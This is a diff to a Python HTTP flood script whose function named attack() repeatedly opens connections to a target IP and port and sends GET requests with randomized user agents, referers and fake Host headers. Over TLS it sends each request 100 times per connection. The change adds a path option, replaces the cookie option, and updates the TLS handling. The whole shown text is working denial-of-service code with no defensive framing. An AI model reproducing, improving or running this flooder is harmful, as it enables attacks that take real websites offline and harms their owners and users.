@@ -8,17 +8,17 @@ import sys
 import time
 
 ip = ""
-port = 443
+port = 80
 period = 10
-ckie = ""
+path = ""
 num_sent = 0
 for n,args in enumerate(sys.argv):
-	if args=="-i":
-		ip = str(sys.argv[n+1])
-	if args=="-p":
-		port = int(sys.argv[n+1])
-	if args=="-c":
-		ckie = str(sys.argv[n+1])
+    if args=="-i":
+        ip = str(sys.argv[n+1])
+    if args=="-p":
+        port = int(sys.argv[n+1])
+    if args=="-path":
+        path = str(sys.argv[n+1])
 
 Choice = random.choice
 useragents = [
@@ -81,31 +81,53 @@ referers = [
 	"https://www.google.co.ao/search?q=",
 ]
 
+wordlist = [
+    "detonator",
+    "concept",
+    "enjoy",
+    "equation",
+    "afterwards",
+    "flavoring",
+    "hoaxer",
+    "disbeliever",
+    "wreck",
+    "abuse",
+    "belly",
+    "halfway",
+    "grieving",
+    "fortress",
+    "hobby",
+    "consumer",
+    "courageous",
+    "amnesia",
+    "weapon",
+    "chicken",
+]
+
 def rqheader():
     connection = "Connection: keep-alive\r\n"
-    cookies = "Cookie: "+ ckie + "\r\n"
     accept = Choice(acceptall)
     referer = "Referer: "+Choice(referers) + ip + "\r\n"
     useragent = "User-Agent: " + Choice(useragents) + "\r\n"
     content = "Content-Type: application/x-www-form-urlencoded\r\n"
     length = "Content-Length: 0 \r\n"
-    header =  connection + cookies + useragent + accept + referer + content + length + "\r\n"
+    header =  connection + useragent + accept + referer + content + length + "\r\n"
     return header
 
 def attack():
     global num_sent
     header = rqheader()
-    num_sent = 0
     go.wait()
     while True:
-        get_host = "GET " + "/?=" + str(random.randint(0,200)) + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
+        get_host = "GET " + path + "/?=" + str(random.randint(0,200)) + " HTTP/1.1\r\nHost: " + Choice(wordlist) + str(random.randint(0,200)) + ".com" +":"+str(port)+ "\r\n"
         request = get_host + header
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
         num_sent = num_sent + 1
         print("[+] Sent ", num_sent, " => ", ip , ":", port)
         if port == 443:
-            x = ssl.wrap_socket(s)
+            context = ssl.create_default_context()
+            x = context.wrap_socket(s,server_hostname=ip)
             try:
                 for i in range (100):
                     x.send(str.encode(request))
